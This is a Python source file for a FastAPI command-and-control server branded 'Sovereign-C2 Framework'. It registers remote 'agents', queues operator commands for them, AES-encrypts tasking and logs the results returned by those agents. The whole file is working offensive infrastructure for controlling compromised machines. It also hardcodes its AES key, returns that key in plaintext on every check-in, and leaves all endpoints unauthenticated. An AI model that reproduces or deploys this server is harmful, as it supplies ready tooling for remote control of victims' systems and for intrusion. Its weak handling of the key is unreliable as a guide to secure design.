######################################################################################################################################################################## 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”).
# Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, 
# and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be
# included in all copies or substantial portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A  
# PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
########################################################################################################################################################################

from fastapi import FastAPI, HTTPException
import json
from pydantic import BaseModel
from typing import Dict
import logging
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import uvicorn

# Banner
def print_banner():
    banner = r"""
  _________                                   .__                         _________  ________             ___________                                                  __    
 /   _____/ _______  __  ____ _______   ____  |__| ____    ____           \_   ___ \ \_____  \            \_   _____/____________     _____   ______  _  _____________|  | __
 \_____  \ /  _ \  \/ /_/ __ \\_  __ \_/ __ \ |  |/ ___\  /    \   ______ /    \  \/  /  ____/    ______   |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /
 /        (  <_> )   / \  ___/ |  | \/\  ___/ |  / /_/  >|   |  \ /_____/ \     \____/       \   /_____/   |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    < 
/_______  /\____/ \_/   \___  >|__|    \___  >|__\___  / |___|  /          \______  /\_______ \            \___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \
        \/                  \/             \/   /_____/       \/                  \/         \/                \/                \/       \/     \/                        \/

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/      (_ _)
                                 /\      {====}     )___(        | |____....----....____         _
                      (\=,      //\\      )__(     /_____\       | |\                . .~~~~---~~ |
      __    |'-'-'|  //  .\    (    )    /____\     |   |        | | |         __\\ /(/(  .       |
     /  \   |_____| (( \_  \    )__(      |  |      |   |        | | |      <--= '|/_/_( /|       |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |        | | |       }\~) | / _(./      ..|
    /____\   |   |  (/     \    |  |      |  |      |   |        | | |.:::::::\\/      --...::::::|
     |  |    |   |   | _.-'|    |  |      |  |      |   |        | | |:::::::::\//::\\__\:::::::::|
     |__|    )___(    )___(    /____\    /____\    /_____\       | | |::::::::_//_:_//__\\_:::::::| 
    (====)  (=====)  (=====)  (======)  (======)  (=======)      | | |::::::::::::::::::::::::::::|
    }===={  }====={  }====={  }======{  }======{  }======={      | |/:::''''~~~~'''':::::::::::::'~
   (______)(_______)(_______)(________)(________)(_________)     | |

           Sovereign-C2 Framework
    """
    print(banner)
    print("Sovereign-c2 - 41PH4-01 & Our Community\n")

app = FastAPI()
agents: Dict[str, Dict] = {}

# Configuring logging
logging.basicConfig(filename="c2_server.log", level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')

class CheckinRequest(BaseModel):
    AgentID: str

class ResultRequest(BaseModel):
    AgentID: str
    Result: str

class CommandRequest(BaseModel):
    AgentID: str
    Command: str

# Load AES Key (Ensure it is 32 bytes for AES-256)
key_b64 = "ywD3S70cYF56DLw3GHYA9MzCflWAMcljQKoeKXbanqc="  # Replace with your actual key
key = base64.b64decode(key_b64)

def check_key_length(key: bytes) -> bytes:
    if len(key) not in [16, 24, 32]:
        raise ValueError(f"Incorrect AES key length ({len(key)} bytes)")
    return key

def encrypt_data(data: str, key: bytes) -> str:
    key = check_key_length(key)
    cipher = AES.new(key, AES.MODE_CBC)
    iv = cipher.iv
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    encrypted_data = base64.b64encode(iv + ct_bytes).decode('utf-8')
    return encrypted_data

def decrypt_data(data: str, key: bytes) -> str:
    key = check_key_length(key)
    try:
        raw_data = base64.b64decode(data)
        iv, ct = raw_data[:16], raw_data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except Exception as e:
        logging.error(f"Decryption failed: {str(e)}")
        raise HTTPException(status_code=400, detail="Decryption failed")

@app.post("/checkin")
def checkin(request: CheckinRequest):
    agent_id = request.AgentID
    if agent_id not in agents:
        agents[agent_id] = {"commands": []}
        logging.info(f"New agent registered: {agent_id}")

    if agents[agent_id]["commands"]:
        command = agents[agent_id]["commands"].pop(0)
        response = encrypt_data(command, key)
    else:
        response = encrypt_data("NoCommand", key)

    return {"key": key_b64, "data": response}

@app.post("/result")
def result(request: ResultRequest):
    agent_id = request.AgentID
    try:
        decrypted_result = decrypt_data(request.Result, key)
        message = f"Agent {agent_id} executed command with result: {decrypted_result}"
        logging.info(message)
        print(message, flush=True)  # Print to console for real-time monitoring
    except Exception as e:
        logging.error(f"Failed to process result from agent {agent_id}: {str(e)}")
        raise HTTPException(status_code=400, detail="Decryption failed")

    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")

    return {"Status": "OK"}

@app.get("/list_agents")
def list_agents():
    return {"agents": [{"AgentID": agent_id} for agent_id in agents]}

@app.post("/sendcommand")
def send_command(request: CommandRequest):
    agent_id = request.AgentID
    command = request.Command
    if agent_id in agents:
        agents[agent_id]["commands"].append(command)
        logging.info(f"Command sent to agent {agent_id}: {command}")
        return {"Status": "Command sent"}
    raise HTTPException(status_code=404, detail="Agent not found")

def run_server():
    uvicorn.run(app, host="0.0.0.0", port=8000)

if __name__ == "__main__":
    run_server()

